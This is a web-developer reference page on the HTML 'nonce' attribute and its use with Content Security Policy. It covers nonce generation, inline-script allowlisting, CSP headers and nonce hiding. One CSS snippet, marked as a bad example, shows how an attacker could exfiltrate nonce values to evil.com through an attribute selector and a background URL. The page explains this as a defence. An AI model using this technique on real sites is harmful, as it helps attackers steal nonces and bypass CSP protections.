---
title: nonce
slug: Web/HTML/Global_attributes/nonce
page-type: html-attribute
browser-compat: html.global_attributes.nonce
---

{{HTMLSidebar("Global_attributes")}}

The **`nonce`** [global attribute](/en-US/docs/Web/HTML/Global_attributes)
is a content attribute defining a cryptographic nonce ("number used once") which can be used by
[Content Security Policy](/en-US/docs/Web/HTTP/CSP) to determine whether or not a given fetch will
be allowed to proceed for a given element.

## Description

The `nonce` attribute is useful to allowlist specific elements, such as a particular inline script or style elements.
It can help you to avoid using the [CSP](/en-US/docs/Web/HTTP/CSP) `unsafe-inline` directive, which would allowlist _all_ inline scripts or styles.

> **Note:** Only use `nonce` for cases where you have no way around using unsafe inline script
> or style contents. If you don't need `nonce`, don't use it. If your script is static, you could also use a CSP hash instead.
> (See usage notes on [unsafe inline script](/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Always try to take full advantage of [CSP](/en-US/docs/Web/HTTP/CSP) protections and avoid nonces or unsafe inline scripts whenever possible.

### Using nonce to allowlist a \<script> element

There are a few steps involved to allowlist an inline script using the nonce mechanism:

#### Generating values

From your web server, generate a random base64-encoded string of at least 128 bits of data from a cryptographically secure
random number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Allowlisting inline script

The nonce generated on your backend code should now be used for the inline script that you'd like to allowlist:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Sending a nonce with a CSP header

Finally, you'll need to send the nonce value in a
[`Content-Security-Policy`](/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) header
(prepend `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Accessing nonces and nonce hiding

For security reasons, the `nonce` content attribute is hidden (an empty string will be returned).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

The [`nonce`](/en-US/docs/Web/API/HTMLElement/nonce) property is the only way to access nonces:

```js example-good
script.nonce; // returns nonce value
```

Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data
from content attributes like this:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Specifications

{{Specifications}}

## Browser compatibility

{{Compat}}

## See also

- [`HTMLElement.nonce`](/en-US/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/en-US/docs/Web/HTTP/CSP)
- CSP: [`script-src`](/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
